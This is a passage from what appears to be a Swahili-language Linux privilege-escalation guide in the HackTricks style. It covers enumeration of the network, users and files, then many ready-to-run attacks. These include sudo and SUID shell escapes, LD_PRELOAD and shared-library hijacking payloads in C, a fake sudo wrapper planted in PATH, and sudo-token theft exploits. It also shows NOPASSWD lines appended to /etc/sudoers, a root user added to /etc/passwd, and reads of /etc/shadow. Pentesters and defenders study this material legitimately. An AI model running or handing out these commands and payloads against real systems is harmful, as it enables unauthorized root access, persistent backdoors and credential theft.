<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya enumerate na exploit mawasiliano ya D-Bus hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Daima ni jambo la kuvutia kufanya enumerate mtandao na kubaini nafasi ya mashine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Bandari zilizo wazi

Kila mara angalia huduma za mtandao zinazokimbia kwenye mashine ambazo hukuweza kuingiliana nazo kabla ya kuipata:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia ikiwa unaweza sniff traffic. Ikiwa unaweza, unaweza kupata baadhi ya credentials.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Angalia wewe ni **nani**, ni **privileges** gani ulizonazo, ni **users** gani wako kwenye mfumo, ni yapi wanaweza **login** na ni yapi wana **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya matoleo ya Linux yaliathiriwa na hitilafu inayowawezesha watumiaji wenye **UID > INT_MAX** kuinua privileges. Taarifa zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Makundi

Angalia kama wewe ni **mwanachama wa kikundi fulani** ambacho kinaweza kukupa root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Angalia kama kuna kitu chochote cha kuvutia ndani ya clipboard (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nenosiri
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila Zinazojulikana

Ikiwa **unajua nenosiri lolote** la mazingira **jaribu kuingia kama kila mtumiaji** ukitumia nenosiri hilo.

### Su Brute

Ikiwa hautajali kusababisha kelele nyingi na binaries za `su` na `timeout` ziko kwenye kompyuta, unaweza kujaribu ku-brute-force mtumiaji ukitumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kwa parameter ya `-a` pia inajaribu ku-brute-force watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ikiwa utagundua kwamba unaweza **kuandika ndani ya folda fulani ya $PATH** unaweza kuweza kupandisha ruhusa kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** kwa jina la amri fulani ambayo itatekelezwa na mtumiaji mwingine (kama root ikiwezekana) na ambayo **haitachukuliwi kutoka kwenye folda iliyoko kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani ukitumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika mafaili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Usanidi wa sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa ruhusa za mtumiaji mwingine bila kujua nenosiri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ssh key kwenye saraka ya `root` au kwa kuitisha `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Maelekezo haya yanamruhusu mtumiaji **set an environment variable** wakati wa kutekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **based on HTB machine Admirer**, ulikuwa **dhaifu** kwa **PYTHONPATH hijacking** ili kupakia maktaba yoyote ya python wakati script ikitekelezwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Njia za kupita kando za utekelezaji wa Sudo

**Ruka** kusoma mafaili mengine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** imetumika (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kuzuia**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bila kuainisha path ya amri

Ikiwa **sudo permission** imetolewa kwa amri moja tu **bila kuainisha path**: _hacker10 ALL= (root) less_ unaweza exploit kwa kubadilisha PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii inaweza pia kutumika ikiwa **suid** binary **inatekeleza amri nyingine bila kubainisha njia yake (daima angalia na** _**strings**_ **yaliyomo ya SUID binary isiyo ya kawaida)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary na njia ya amri

Ikiwa **suid** binary **inatekeleza amri nyingine kwa kubainisha njia**, basi unaweza kujaribu **export a function** yenye jina la amri ambayo faili ya suid inaiita.

Kwa mfano, ikiwa **suid** binary inaaita _**/usr/sbin/service apache2 start**_ unalazimika kujaribu kuunda function na kui-export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapomuita suid binary, kazi hii itaendeshwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable inatumiwa kubainisha maktaba moja au zaidi za kushirikiwa (.so files) ambazo loader itapakia kabla ya zote nyingine, ikiwemo standard C library (`libc.so`). Mchakato huu unajulikana kama ku-preload maktaba.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumika vibaya, hasa kwa executables za **suid/sgid**, mfumo unaweka masharti yafuatayo:

- Loader haizingatii **LD_PRELOAD** kwa executables ambapo real user ID (_ruid_) haitalingana na effective user ID (_euid_).
- Kwa executables zenye suid/sgid, maktaba zinazopakiwa awali ni zile tu zilizomo katika paths za kawaida ambazo pia ni suid/sgid.

Privilege escalation inaweza kutokea ikiwa una uwezo wa kutekeleza amri kwa `sudo` na matokeo ya `sudo -l` yanajumuisha kauli **env_keep+=LD_PRELOAD**. Mipangilio hii inaruhusu environment variable **LD_PRELOAD** kudumu na kutambulika hata wakati amri zinaendeshwa kwa `sudo`, jambo ambalo linaweza kusababisha utekelezwaji wa arbitrary code kwa vigezo vilivyoongezwa vya ruhusa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile it** ukitumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **escalate privileges** kwa kuendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc inayofanana inaweza kutumika vibaya ikiwa mshambuliaji anadhibiti env variable **LD_LIBRARY_PATH** kwa sababu anadhibiti njia ambako maktaba zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Ukikutana na binary yenye ruhusa za **SUID** ambazo zinaonekana zisizo za kawaida, ni desturi nzuri kuthibitisha ikiwa inapakia faili za **.so** ipasavyo. Hii inaweza kukaguliwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaonyesha uwezekano wa utumiaji wa udhaifu.

Ili kutumia hili, mtu angeendelea kwa kuunda C file, sema _"/path/to/.config/libcalc.c"_, yenye msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, mara utakapokusanywa na kutekelezwa, unalenga kuinua vibali kwa kubadili ruhusa za faili na kuendesha shell yenye vibali vilivyoongezeka.

Kusanya faili ya C iliyotajwa hapo juu kuwa shared object (.so) kwa kutumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Mwishowe, kuendesha binary ya SUID iliyothiriwa kunapaswa kuchochea exploit, na hivyo kuruhusu uvunjaji wa mfumo uwezekane.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa tumepata SUID binary inayopakia library kutoka kwenye folda ambapo tunaweza kuandika, hebu tuunde library katika folda hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapokea kosa kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hii ina maana kwamba maktaba uliyoiunda inapaswa kuwa na function inayoitwa `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyopangwa ya Unix binaries ambazo zinaweza kutumiwa na mshambuliaji kuvuka vikwazo vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa matukio ambapo unaweza **kuingiza hoja tu** katika amri.

Mradi unaokusanya legitimate functions za Unix binaries ambazo zinaweza kutumiwa vibaya kuondoka katika restricted shells, escalate au maintain elevated privileges, transfer files, spawn bind na reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l` unaweza kutumia zana [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) ili kuangalia kama inapata jinsi ya ku-exploit sheria yoyote ya sudo.

### Reusing Sudo Tokens

Katika matukio ambapo una **sudo access** lakini huna password, unaweza escalate privileges kwa **kusubiri utekelezaji wa amri ya sudo kisha hijack session token**.

Mahitaji ya escalate privileges:

- Tayari una shell kama user "_sampleuser_"
- "_sampleuser_" amekuwa **akitumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa default hapo ndio muda wa sudo token unaoturuhusu kutumia `sudo` bila kuingiza password)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kui-pakiwa)

(Unaweza kwa muda kuwezesha `ptrace_scope` kwa kutumia `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kudumu kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Kama mahitaji haya yote yametimizwa, **unaweza escalate privileges kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) itaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **kuactivate sudo token katika session yako** (hutaapata moja kwa moja root shell, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **inayomilikiwa na root yenye setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **exploit ya tatu** (`exploit_v3.sh`) **itaunda sudoers file** ambayo inafanya **sudo tokens kuwa ya milele na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **write permissions** kwenye folda au kwenye yoyote ya faili zilizoundwa ndani ya folda unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ku**unda sudo token kwa user na PID**.\
Kwa mfano, ikiwa unaweza ku-overwrite faili _/var/run/sudo/ts/sampleuser_ na una shell kama user huyo mwenye PID 1234, unaweza **obtain sudo privileges** bila kuhitaji kujua password kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. These files **by default can only be read by user root and group root**.\
**Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utakuwa na uwezo wa **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika unaweza kutumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna baadhi ya mbadala kwa binary ya `sudo` kama `doas` kwa OpenBSD; kumbuka kuangalia usanidi wake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kawaida hujiunga kwenye mashine na hutumia `sudo`** kuinua vibali na umepata shell ndani ya muktadha wa mtumiaji huyo, unaweza **kuunda executable mpya ya sudo** ambayo itaendesha code yako kama root kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano kwa kuongeza path mpya katika .bash_profile) ili wakati mtumiaji anatekeleza sudo, executable yako ya sudo itatekelezwa.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash) utahitaji kubadilisha faili nyingine ili kuongeza path mpya. Kwa mfano [sudo-piggyback](https://github.com/APTy/sudo-piggyback) inabadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **wapi faili za usanidi zinazopakiwa zipo**. Kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii inamaanisha kwamba faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi zinaonyesha **folda nyingine** ambapo **libraries** zitatafutwa. Kwa mfano, yaliyomo katika `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kwamba mfumo utafuta libraries ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu fulani **mtumiaji ana ruhusa za kuandika** kwenye mojawapo ya njia zilizoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote ndani ya faili ya usanidi iliyotajwa katika `/etc/ld.so.conf.d/*.conf` anaweza kufanikiwa kuinua ruhusa.\
Angalia **how to exploit this misconfiguration** kwenye ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib katika `/var/tmp/flag15/` itatumiwa na programu mahali hapa kama ilivyoainishwa katika kigezo cha `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha tengeneza maktaba hasidi katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Linux capabilities provide a **subset of the available root privileges to a process**. Hii kwa ufanisi inavunja **privileges za root kuwa vitengo vidogo na vinavyotofautiana**. Kila kimoja cha vitengo hivi kinaweza kisha kupewa kwa miamala kwa uhuru. Kwa njia hii seti kamili ya privileges inapunguzwa, kupunguza hatari za exploitation.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za saraka

Katika saraka, the **bit for "execute"** ina maana kuwa mtumiaji aliyeathirika anaweza "**cd**" ndani ya folda.\
The **"read"** bit ina maana mtumiaji anaweza **kuorodhesha** the **files**, na the **"write"** bit ina maana mtumiaji anaweza **kufuta** na **kuunda** **files** mpya.

## ACLs

Access Control Lists (ACLs) zinawakilisha tabaka la pili la ruhusa za kutegemea hiari, zenye uwezo wa **overriding the traditional ugo/rwx permissions**. Ruhusa hizi zinaongeza udhibiti wa upatikanaji wa faili au saraka kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au sehemu ya kundi. Kiwango hiki cha **granularity ensures more precise access management**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpa** mtumiaji "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACLs maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua shell sessions

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell** session za mtumiaji mwingine (**root**).\
Katika **matoleo mapya zaidi** utaweza tu **connect** kwenye screen sessions za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hii ilikuwa tatizo kwa **old tmux versions**.

Sikuweza ku-hijack kikao cha tmux (v2.1) kilichoundwa na root nikiwa non-privileged user.

**Orodhesha vikao vya tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Funguo zote za SSL na SSH zilizotengenezwa kwenye mifumo inayotegemea Debian (Ubuntu, Kubuntu, etc) kati ya Septemba 2006 na Mei 13, 2008 zinaweza kuathiriwa na hitilafu hii.\
Hitilafu hii ilitokana wakati wa kuunda ufunguo mpya wa ssh kwenye OS hizo, kwani **tofauti 32,768 tu zilikuwa zinazowezekana**. Hii ina maana kwamba uwezekano wote unaweza kuhesabiwa na **ukiwa na ufunguo wa umma wa ssh unaweza kutafuta ufunguo binafsi unaolingana**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Inaeleza ikiwa uthibitisho kwa nywila unaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Inaeleza ikiwa uthibitisho kwa public key unaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati uthibitisho kwa nywila unaporuhusiwa, inaeleza ikiwa server inaruhusu kuingia kwenye akaunti zenye nywila tupu. Chaguo-msingi ni `no`.

### PermitRootLogin

Inaeleza kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia nywila na private key
- `without-password` or `prohibit-password`: root anaweza kuingia kwa private key pekee
- `forced-commands-only`: Root anaweza kuingia kwa private key pekee na ikiwa chaguzi za amri (commands) zimetajwa
- `no` : hapana

### AuthorizedKeysFile

Inaainisha faili zinazohifadhi public keys ambazo zinaweza kutumika kwa uthibitisho wa mtumiaji. Inaweza kuwa na tokeni kama `%h`, ambazo zitabadilishwa na saraka ya home. **Unaweza kuonyesha absolute paths** (zinaanza na `/`) au **relative paths kutoka kwenye home ya mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inakuruhusu **use your local SSH keys instead of leaving keys** (without passphrases!) zinazokaa kwenye server yako. Kwa hivyo, utaweza **jump** via ssh **to a host** na kutoka hapo **jump to another** host **using** the **key** iliyoko kwenye **initial host** yako.

Unaahitaji kuweka chaguo hili kwenye `$HOME/.ssh.config` kama ifuatavyo:
```
Host example.com
ForwardAgent yes
```
Kumbuka kwamba ikiwa `Host` ni `*`, kila wakati mtumiaji anapohama kwenda mashine tofauti, mwenyeji huyo atakuwa na uwezo wa kufikia funguo (ambayo ni tatizo la usalama).

Faili `/etc/ssh_config` inaweza **kupindua** chaguzi hizi na kuruhusu au kukataa usanidi huu.\ Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukanusha** ssh-agent forwarding kwa kutumia neno muhimu `AllowAgentForwarding` (chaguo-msingi ni kuruhusu).

Kama utagundua kwamba Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kwani **huenda ukaweza kuitumia vibaya kuongeza ruhusa**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Mafaili Muhimu

### Mafaili ya Profaili

Faili `/etc/profile` na mafaili yaliyopo chini ya `/etc/profile.d/` ni **scripts zinazotekelezwa wakati mtumiaji anapoendesha shell mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kubadilisha yoyote kati yao unaweza kuongeza ruhusa**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa script yoyote ya profile isiyo ya kawaida inapatikana, unapaswa kuikagua kwa ajili ya **maelezo nyeti**.

### Faili za Passwd/Shadow

Kutegemea OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa zinatumia jina tofauti au kunaweza kuwa na chelezo. Kwa hivyo inashauriwa **kutafuta zote** na **kukagua kama unaweza kusoma** ili kuona **ikiwa kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Wakati mwingine unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au sawa).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd inayoweza kuandikwa

Kwanza, tengeneza password kwa kutumia moja ya maagizo yafuatayo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Kisha ongeza mtumiaji `hacker` na ongeza nenosiri lililotengenezwa.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Kwa mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` ukitumia `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa bandia bila nywila.\
ONYO: unaweza kudhoofisha usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Kumbuka: Katika majukwaa ya BSD `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` limepewa jina jipya `/etc/spwd.db`.

Unapaswa kuangalia ikiwa unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, je, unaweza kuandika kwenye **faili ya usanidi ya huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **kuhariri faili ya usanidi ya huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itatekelezwa wakati tomcat itakapowashwa tena.

### Angalia Folda

Folda zifuatazo zinaweza kuwa na nakala za akiba au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hautaweza kusoma ya mwisho, lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali Ajabu/Owned faili
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
